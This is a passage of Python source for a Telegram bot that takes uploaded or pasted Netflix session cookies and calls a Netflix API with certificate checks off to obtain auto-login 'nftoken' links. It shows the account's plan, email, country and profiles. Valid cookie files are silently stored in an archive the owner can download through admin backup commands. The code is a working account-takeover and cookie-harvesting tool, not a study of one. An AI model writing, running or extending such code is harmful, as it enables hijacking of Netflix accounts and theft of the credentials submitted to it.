    channel_url = f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}" if CHANNEL_USERNAME else "https://t.me/"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t(lang, "btn_channel"), url=channel_url)],
        [InlineKeyboardButton(t(lang, "btn_scan"), callback_data="scan_file")],
        [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")],
    ])


# ==================== MESSAGE BUILDERS ====================

def _welcome_text(lang: str, daily_used: int = 0, daily_limit: int = BASE_DAILY_LIMIT) -> str:
    remaining = max(0, daily_limit - daily_used)
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('welcome_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('welcome_desc')}\n\n"
        f"{L('formats_title')}\n"
        f"{L('fmt_netscape')}\n"
        f"{L('fmt_json')}\n"
        f"{L('fmt_raw')}\n\n"
        f"{L('how_to_title')}\n"
        f"{L('step1')}\n"
        f"{L('step2')}\n"
        f"{L('step3')}\n\n"
        f"{L('daily_used')} {daily_used}/{daily_limit} ({remaining} remaining)\n\n"
        f"{L('disclaimer')}\n"
        f"{L('channel_label')} {CHANNEL_USERNAME}"
    )


def _ask_for_file_text(lang: str) -> str:
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('ask_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('ask_desc')}\n"
        f"{L('fmt_netscape')}\n"
        f"{L('fmt_json')}\n"
        f"{L('fmt_raw')}\n\n"
        f"{L('ask_note')}"
    )


def _invalid_cookie_user_message(lang: str) -> str:
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('invalid_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('invalid_desc')}\n\n"
        f"{L('inv_reason1')}\n"
        f"{L('inv_reason2')}\n"
        f"{L('inv_reason3')}\n\n"
        f"{L('retry_title')}\n"
        f"{L('retry1')}\n"
        f"{L('retry2')}\n"
        f"{L('retry3')}\n\n"
        f"{L('retry_hint')}"
    )


def _referral_info_text(lang: str, bot_username: str, user_id: int) -> str:
    data = _load_referrals()
    uid = str(user_id)
    referred_count = len(data.get(uid, {}).get("referred_users", []))
    bonus = _get_user_bonus(user_id)
    current_limit = _get_effective_daily_limit(user_id)
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    L = lambda k, **kw: t(lang, k, **kw)
    return (
        f"{L('ref_title')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{L('ref_desc')}\n\n"
        f"{L('ref_how_title')}\n"
        f"{L('ref_step1')}\n"
        f"{L('ref_step2')}\n"
        f"{L('ref_step3')}\n"
        f"{L('ref_step4')}\n\n"
        f"{L('ref_stats_title')}\n"
        f"{L('ref_friends')} <b>{referred_count}</b>\n"
        f"{L('ref_bonus')} <b>+{bonus}</b>\n"
        f"{L('ref_limit')} <b>{current_limit}/{REFERRAL_MAX_DAILY_LIMIT}</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{L('ref_link_label')}\n<code>{invite_link}</code>\n\n"
        f"{L('ref_copy_hint')}"
    )


async def animated_processing(msg, steps: list[str], stop_event: asyncio.Event):
    for step in steps:
        if stop_event.is_set():
            return
        try:
            await msg.edit_text(f"⏳ <b>{step}</b>", parse_mode="HTML")
        except Exception:
            pass
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=0.5)
            return
        except asyncio.TimeoutError:
            pass


# ==================== HELPER FUNCTIONS ====================

def _get_file_extension(filename: str) -> str:
    if not filename:
        return ""
    return os.path.splitext(filename)[1].lower()


def _is_compressed_file(filename: str) -> bool:
    ext = _get_file_extension(filename)
    return ext in COMPRESSED_EXTENSIONS


def _calculate_file_hash(file_bytes: bytes) -> str:
    return hashlib.md5(file_bytes).hexdigest()


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)
        elif isinstance(data, dict):
            if any(key in data for key in COOKIE_KEYS):
                for key in COOKIE_KEYS:
                    value = data.get(key)
                    if isinstance(value, str):
                        cookie_dict[key] = _decode_cookie_value(value)
            elif isinstance(data.get("cookies"), list):
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name in COOKIE_KEYS and isinstance(value, str):
                        cookie_dict[name] = _decode_cookie_value(value)
        if cookie_dict:
            return cookie_dict
    except (json.JSONDecodeError, TypeError):
        pass
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"\s+", line)
        if len(parts) >= 2:
            name = parts[-2].strip()
            value = parts[-1].strip()
            if name in COOKIE_KEYS and name not in cookie_dict:
                cookie_dict[name] = _decode_cookie_value(value)
    for key in COOKIE_KEYS:
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match and key not in cookie_dict:
            cookie_dict[key] = _decode_cookie_value(match.group(1))
    return cookie_dict


def _make_cookie_str(cookie_dict):
    nid = cookie_dict.get("NetflixId", "")
    snid = cookie_dict.get("SecureNetflixId", "")
    parts = [f"NetflixId={nid}"]
    if snid:
        parts.append(f"SecureNetflixId={snid}")
    for k in ("nfvdid", "OptanonConsent"):
        v = cookie_dict.get(k)
        if v:
            parts.append(f"{k}={v}")
    return "; ".join(parts)


def fetch_netflix_data(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Could not find 'NetflixId' in the provided text.")
    cookie_str = _make_cookie_str(cookie_dict)
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = cookie_str
    params = list(QUERY_PARAMS.items()) + [("path", '["account","token","default"]')]
    response = requests.get(API_URL, params=params, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    raw = response.json()
    val = raw.get("value") or {}
    account = val.get("account") or {}
    token_data = (account.get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        raise ValueError("Operation failed — the server did not return a token.")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000
    return {"token": token, "expires": expires}


# ==================== RATE LIMITING (PERSISTENT ON VOLUME) ====================

BATCH_LIMIT = 5
BATCH_COOLDOWN = 5 * 60
DAILY_WINDOW = 24 * 60 * 60


def _load_rates() -> dict:
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        return json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        return {}


def _save_rates(data: dict) -> None:
    RATE_LIMITS_FILE.write_text(json.dumps(data))


def _check_rate_limit(user_id: int):
    if user_id == OWNER_ID:
        return True, None
    now = time.time()
    rates = _load_rates()
    uid = str(user_id)
    effective_limit = _get_effective_daily_limit(user_id)
    user = rates.get(uid, {
        "batch_count": 0, "batch_reset_at": 0,
        "daily_count": 0, "daily_reset_at": now + DAILY_WINDOW,
    })
    if now >= user.get("daily_reset_at", 0):
        user["daily_count"] = 0
        user["daily_reset_at"] = now + DAILY_WINDOW
    if user.get("daily_count", 0) >= effective_limit:
        remaining = int(user["daily_reset_at"] - now)
        h, m = divmod(remaining // 60, 60)
        lang = _load_user_lang(user_id) or DEFAULT_LANG
        return False, t(lang, "limit_reached", limit=effective_limit, time=f"{h}h {m}m")
    if now >= user.get("batch_reset_at", 0):
        user["batch_count"] = 0
    if user.get("batch_count", 0) >= BATCH_LIMIT:
        remaining = int(user["batch_reset_at"] - now)
        m, s = divmod(remaining, 60)
        lang = _load_user_lang(user_id) or DEFAULT_LANG
        return False, t(lang, "slow_down", batch=BATCH_LIMIT, time=f"{m}m {s}s")
    user["batch_count"] = user.get("batch_count", 0) + 1
    user["daily_count"] = user.get("daily_count", 0) + 1
    if user["batch_count"] >= BATCH_LIMIT:
        user["batch_reset_at"] = now + BATCH_COOLDOWN
    rates[uid] = user
    _save_rates(rates)
    return True, None


def _register_user(user_id: int) -> bool:
    _ensure_file_exists(USERS_FILE, "")
    existing: set[str] = set()
    try:
        existing = {line.strip() for line in USERS_FILE.read_text().splitlines() if line.strip()}
    except Exception:
        pass
    uid = str(user_id)
    if uid in existing:
        return False
    with open(USERS_FILE, "a") as f:
        f.write(uid + "\n")
    return True


async def _send_error_response(target_update_or_message, error_text: str, user_id: int):
    user_states[user_id] = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    fallback_instruction = "\n\n" + t(lang, "stuck_hint")
    full_error_text = error_text + fallback_instruction
    common_keyboard = _get_common_keyboard(lang)
    try:
        if isinstance(target_update_or_message, Update):
            await target_update_or_message.message.reply_text(
                full_error_text, parse_mode="HTML",
                reply_markup=common_keyboard, disable_web_page_preview=True
            )
        else:
            try:
                await target_update_or_message.edit_text(
                    full_error_text, parse_mode="HTML",
                    reply_markup=common_keyboard, disable_web_page_preview=True
                )
            except Exception:
                await target_update_or_message.message.reply_text(
                    full_error_text, parse_mode="HTML",
                    reply_markup=common_keyboard, disable_web_page_preview=True
                )
    except Exception as e:
        print(f"CRITICAL: Failed to send error response to {user_id}: {e}")


# ==================== SUBSCRIPTION CHECK ====================

async def _is_user_subscribed(bot, user_id: int) -> bool:
    chat_id = CHANNEL_ID if CHANNEL_ID else CHANNEL_USERNAME
    try:
        member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False


# ==================== ADMIN COMMANDS ====================

async def backup_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for fpath in [USERS_FILE, REFERRALS_FILE]:
                if fpath.exists():
                    zf.write(fpath, arcname=fpath.name)
        buf.seek(0)
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        await update.message.reply_document(
            document=buf, filename=f"flexible_x_data_backup_{timestamp}.zip",
            caption=t(DEFAULT_LANG, "backup_data_caption"), parse_mode="HTML"
        )
    except Exception as exc:
        await update.message.reply_text(f"❌ Backup failed:\n{exc}")


async def backup_files_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    status_msg = await update.message.reply_text(t(DEFAULT_LANG, "backup_files_progress"), parse_mode="HTML")
    try:
        buf = io.BytesIO()
        file_count = 0
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            if ARCHIVE_ROOT.exists():
                for fpath in ARCHIVE_ROOT.rglob("*"):
                    if fpath.is_file():
                        arcname = fpath.relative_to(VOLUME_ROOT)
                        zf.write(fpath, arcname=str(arcname))
                        file_count += 1
        buf.seek(0)
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        await status_msg.delete()
        await update.message.reply_document(
            document=buf, filename=f"flexible_x_archive_backup_{timestamp}.zip",
            caption=t(DEFAULT_LANG, "backup_files_caption", count=file_count), parse_mode="HTML"
        )
    except Exception as exc:
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(f"❌ Archive backup failed:\n{exc}")


async def clear_files_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        from energy_house import clear_archive
        deleted_count = await asyncio.to_thread(clear_archive)
        await update.message.reply_text(
            t(DEFAULT_LANG, "clear_success", count=deleted_count), parse_mode="HTML"
        )
    except Exception as exc:
        await update.message.reply_text(f"❌ Clear failed:\n{exc}")


# ==================== CALLBACK HANDLERS ====================

async def set_language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    lang_code = query.data.replace("setlang_", "")
    if lang_code not in SUPPORTED_LANGS:
        lang_code = DEFAULT_LANG
    _save_user_lang(user_id, lang_code)
    await query.answer(f"✅ {TRANSLATIONS[lang_code]['lang_name']}")
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(
            text=_welcome_text(lang_code, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang_code),
            disable_web_page_preview=True
        )
    except Exception:
        await query.message.reply_text(
            text=_welcome_text(lang_code, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang_code),
            disable_web_page_preview=True
        )


async def change_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    await query.answer()
    L = lambda k, **kw: t(lang, k, **kw)
    try:
        await query.edit_message_text(
            text=f"{L('select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{L('select_lang_desc')}",
            reply_markup=_build_lang_selection_keyboard(),
            disable_web_page_preview=True
        )
    except Exception:
        await query.message.reply_text(
            text=f"{L('select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{L('select_lang_desc')}",
            reply_markup=_build_lang_selection_keyboard(),
            disable_web_page_preview=True
        )


async def scan_file_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")],
        ])
        try:
            await query.edit_message_text(text=t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await query.message.reply_text(text=t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    user_states[user_id] = WAITING_FOR_FILE
    try:
        await query.edit_message_text(text=_ask_for_file_text(lang), reply_markup=None)
    except Exception:
        await query.message.reply_text(text=_ask_for_file_text(lang), reply_markup=None)


async def check_subscription_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if subscribed:
        user_states[user_id] = WAITING_FOR_FILE
        try:
            await query.edit_message_text(text=t(lang, "joined_ok"), reply_markup=None)
        except Exception:
            await query.message.reply_text(text=t(lang, "joined_ok"), reply_markup=None)
    else:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")],
        ])
        try:
            await query.edit_message_text(text=t(lang, "not_joined"), reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await query.message.reply_text(text=t(lang, "not_joined"), reply_markup=keyboard, disable_web_page_preview=True)


async def scan_again_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer("🔄", show_alert=False)
    user_states[user_id] = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(
            text=_welcome_text(lang, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True
        )
    except Exception:
        await query.message.reply_text(
            text=_welcome_text(lang, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True
        )


async def show_referral_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer("🎁", show_alert=False)
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    bot_username = context.bot.username or "Flexible_x_bot"
    ref_text = _referral_info_text(lang, bot_username, user_id)
    back_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(t(lang, "btn_back"), callback_data="back_to_menu")],
        [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")],
    ])
    try:
        await query.edit_message_text(text=ref_text, parse_mode="HTML", reply_markup=back_keyboard, disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=ref_text, parse_mode="HTML", reply_markup=back_keyboard, disable_web_page_preview=True)


async def back_to_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(
            text=_welcome_text(lang, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True
        )
    except Exception:
        await query.message.reply_text(
            text=_welcome_text(lang, daily_used, daily_limit),
            reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True
        )


# ==================== START COMMAND ====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    is_new = _register_user(user.id)

    # Handle referral deep link
    if args and len(args) > 0 and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0].replace("ref_", ""))
            if referrer_id != user.id:
                _record_referral(referrer_id, user.id)
        except (ValueError, IndexError):
            pass

    # Notify owner for new users
    if is_new:
        name = html_mod.escape(user.full_name or "—")
        username = f"@{html_mod.escape(user.username)}" if user.username else "—"
        notify_text = (
            f"{t(DEFAULT_LANG, 'new_user_notify')}\n\n"
            f"🔹 <b>Name:</b> {name}\n"
            f"🔹 <b>Username:</b> {username}\n"
            f"🔹 <b>ID:</b> <code>{user.id}</code>"
        )
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=notify_text, parse_mode="HTML")
        except Exception:
            print("⚠️ Could not send new-user notification to OWNER_ID.")

    user_states[user.id] = None

    # Check if user has a saved language
    saved_lang = _get_user_lang_or_none(user.id)
    if not saved_lang:
        # Force language selection screen
        await update.message.reply_text(
            text=f"{t(DEFAULT_LANG, 'select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{t(DEFAULT_LANG, 'select_lang_desc')}",
            reply_markup=_build_lang_selection_keyboard(),
            disable_web_page_preview=True
        )
        return

    # User has a saved language — show welcome
    rates = _load_rates()
    uid = str(user.id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user.id)
    await update.message.reply_text(
        _welcome_text(saved_lang, daily_used, daily_limit),
        reply_markup=_get_welcome_keyboard(saved_lang), disable_web_page_preview=True
    )


# ==================== CORE COOKIE CHECK ====================

async def _run_cookie_check(raw_text: str, processing_msg, user_id: int, file_bytes: bytes = None, file_name: str = None, update: Update = None) -> None:
    stop_animation = asyncio.Event()
    anim_task = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    L = lambda k, **kw: t(lang, k, **kw)

    try:
        anim_task = asyncio.create_task(animated_processing(
            processing_msg,
            [L("anim_validating"), L("anim_connecting"), L("anim_extracting"), L("anim_fetching")],
            stop_animation
        ))

        cookie_dict = extract_cookie_dict(raw_text)
        if not cookie_dict:
            stop_animation.set()
            await _send_error_response(processing_msg, L("err_read_cookies"), user_id)
            return

        try:
            info = fetch_netflix_data(cookie_dict)
        except ValueError as ve:
            stop_animation.set()
            msg = str(ve)
            if "did not return a token" in msg or "could not find 'netflixid'" in msg.lower():
                await _send_error_response(processing_msg, _invalid_cookie_user_message(lang), user_id)
            else:
                await _send_error_response(processing_msg, f"⚠️ Failed:\n{msg}", user_id)
            return

        pc_url = f"https://netflix.com/?nftoken={info['token']}"
        tv_url = f"https://netflix.com/tv8?nftoken={info['token']}"

        try:
            coro = asyncio.to_thread(fetch_account_info_sync, cookie_dict)
            account = await asyncio.wait_for(coro, timeout=30)
        except asyncio.TimeoutError:
            account = {"valid": False}
        except Exception:
            account = {"valid": False}

        stop_animation.set()
        if anim_task:
            try:
                await asyncio.wait_for(anim_task, timeout=1.0)
            except Exception:
                pass

        scan_time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        # Real-time balance
        rates = _load_rates()
        uid = str(user_id)
        daily_used = rates.get(uid, {}).get("daily_count", 0)
        daily_limit = _get_effective_daily_limit(user_id)
        remaining = max(0, daily_limit - daily_used)
        balance_line = L("balance_line", used=daily_used, limit=daily_limit, remaining=remaining)

        if not account.get("valid"):
            account_block = f"\n{L('acct_fail')}"
        else:
            plan = html_mod.escape(account.get("plan") or "Unknown")
            email = html_mod.escape(account.get("email") or "Unknown")
            country = html_mod.escape(account.get("country") or "Unknown")
            profile_names = account.get("profile_names") or []
            profiles_line = ""
            if profile_names:
                display_limit = 4
                display_names = profile_names[:display_limit]
                names_text = ", ".join(html_mod.escape(n) for n in display_names)
                if len(profile_names) > display_limit:
                    names_text = f"{names_text}, {L('more_profiles', count=len(profile_names) - display_limit)}"
                profiles_line = f"{L('profiles')} {names_text}\n"
            extra_allowed = account.get("extra_members_allowed")
            extra_icon = "✅" if extra_allowed else "❌"
            features = account.get("features") or []
            features_text = ", ".join(features) if features else "None detected"
            account_block = (
                f"{L('plan')} {plan}\n"
                f"{L('email')} {email}\n"
                f"{L('country')} {country}\n"
                f"{profiles_line}"
                f"{extra_icon} <b>{L('extra_members')}</b> {L('extra_yes') if extra_allowed else L('extra_no')}\n"
                f"{L('features')} {html_mod.escape(features_text)}"
            )

        result_text = (
            f"{L('success_title')}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{L('scan_time')} {scan_time}\n\n"
            f"{account_block}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{balance_line}\n\n"
            f"{L('login_hint')}"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(L("btn_pc"), url=pc_url), InlineKeyboardButton(L("btn_tv"), url=tv_url)],
            [InlineKeyboardButton(L("btn_android"), url=pc_url), InlineKeyboardButton(L("btn_iphone"), url=pc_url)],
            [InlineKeyboardButton(L("btn_upload"), callback_data="scan_file"), InlineKeyboardButton(L("btn_restart"), callback_data="scan_again")],
            [InlineKeyboardButton(L("btn_change_lang"), callback_data="change_lang")],
        ])

        try:
            await processing_msg.edit_text(result_text, parse_mode="HTML", reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await processing_msg.message.reply_text(result_text, parse_mode="HTML", reply_markup=keyboard, disable_web_page_preview=True)

        # === ARCHIVE: Works for BOTH file uploads AND text pastes ===
        archive_status = "disabled"
        file_hash = None
        bytes_to_store = file_bytes if file_bytes else raw_text.encode("utf-8")
        source_name = file_name or "pasted_cookies.txt"

        if bytes_to_store and account.get("valid"):
            try:
                from energy_house import store_file_from_bytes, init_energy_house
                init_energy_house()
                file_hash = _calculate_file_hash(bytes_to_store)
                storage_path, created = await asyncio.to_thread(
                    store_file_from_bytes, bytes_to_store, source_name, user_id,
                    getattr(processing_msg, "message_id", None), "text/plain",
                    account_info=account, cookie_dict=cookie_dict
                )
                archive_status = "stored" if created else "duplicate"
            except Exception as exc:
                archive_status = f"error: {exc}"
        elif bytes_to_store and not account.get("valid"):
            archive_status = "skipped (invalid account)"

        user_states[user_id] = None

    except requests.RequestException as exc:
        stop_animation.set()
        await _send_error_response(processing_msg, f"{L('err_connection')}\n{exc}", user_id)
    except Exception as exc:
        stop_animation.set()
        await _send_error_response(processing_msg, f"{L('err_unexpected')}\n{exc}", user_id)
    finally:
        stop_animation.set()
        user_states[user_id] = None
        if anim_task and not anim_task.done():
            anim_task.cancel()
            try:
                await anim_task
            except Exception:
                pass


# ==================== FILE UPLOAD HANDLER ====================

async def process_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")],
        ])
        await update.message.reply_text(t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, t(lang, "press_scan_first"), user_id)
        return
    doc = update.message.document
    if _is_compressed_file(doc.file_name or ""):
        await _send_error_response(update, t(lang, "no_compressed"), user_id)
        return
    if doc.file_size and doc.file_size > MAX_FILE_SIZE_BYTES:
        await _send_error_response(update, t(lang, "file_too_large"), user_id)
        return
    mime = doc.mime_type or ""
    ext = _get_file_extension(doc.file_name or "")
    if not (mime.startswith("text") or mime == "application/json" or ext in (".txt", ".json")):
        await _send_error_response(update, t(lang, "wrong_format"), user_id)
        return
    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return
    processing_msg = await update.message.reply_text(t(lang, "init"), parse_mode="HTML")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        raw_bytes = await tg_file.download_as_bytearray()
        raw_text = raw_bytes.decode("utf-8", errors="replace")
    except Exception as exc:
        await _send_error_response(processing_msg, f"⚠️ Could not read the file:\n{exc}", user_id)
        return
    await _run_cookie_check(raw_text, processing_msg, user_id, file_bytes=bytes(raw_bytes), file_name=doc.file_name, update=update)


# ==================== TEXT MESSAGE HANDLER ====================

async def process_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")],
        ])
        await update.message.reply_text(t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, t(lang, "press_scan_first"), user_id)
        return
    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return
    processing_msg = await update.message.reply_text(t(lang, "init"), parse_mode="HTML")
    await _run_cookie_check(update.message.text, processing_msg, user_id, update=update)


# ==================== HEARTBEAT & INIT ====================

async def _heartbeat(application) -> None:
    while True:
        await asyncio.sleep(60)
        try:
            await application.bot.get_me()
            print("✅ Bot is active — Telegram connection OK")
        except Exception as exc:
            print(f"⚠️ Heartbeat failed: {exc} — connection lost, polling will auto-reconnect")


async def _post_init(application) -> None:
    _init_persistent_storage()
    asyncio.create_task(_heartbeat(application))


# ==================== RUN ====================

if __name__ == "__main__":
    bot_token = os.environ.get("BOT_TOKEN")
    if not bot_token:
        raise ValueError("BOT_TOKEN environment variable is not set.")
    app = (
        ApplicationBuilder()
        .token(bot_token)
        .post_init(_post_init)
        .get_updates_read_timeout(60)
        .get_updates_write_timeout(60)
        .get_updates_connect_timeout(30)
        .get_updates_pool_timeout(30)
        .build()
    )
    # User handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(set_language_callback, pattern=r"^setlang_"))
    app.add_handler(CallbackQueryHandler(change_lang_callback, pattern="^change_lang$"))
    app.add_handler(CallbackQueryHandler(scan_file_button, pattern="^scan_file$"))
    app.add_handler(CallbackQueryHandler(scan_again_button, pattern="^scan_again$"))
    app.add_handler(CallbackQueryHandler(check_subscription_callback, pattern="^check_sub$"))
    app.add_handler(CallbackQueryHandler(show_referral_callback, pattern="^show_referral$"))
    app.add_handler(CallbackQueryHandler(back_to_menu_callback, pattern="^back_to_menu$"))
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), process_cookie_file))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), process_cookie_message))
    # Admin-only handlers
    app.add_handler(CommandHandler("backup_data", backup_data_command))
    app.add_handler(CommandHandler("backup_files", backup_files_command))
    app.add_handler(CommandHandler("clear_files", clear_files_command))
    print("Bot is running...")
    app.run_polling(timeout=60, drop_pending_updates=False)
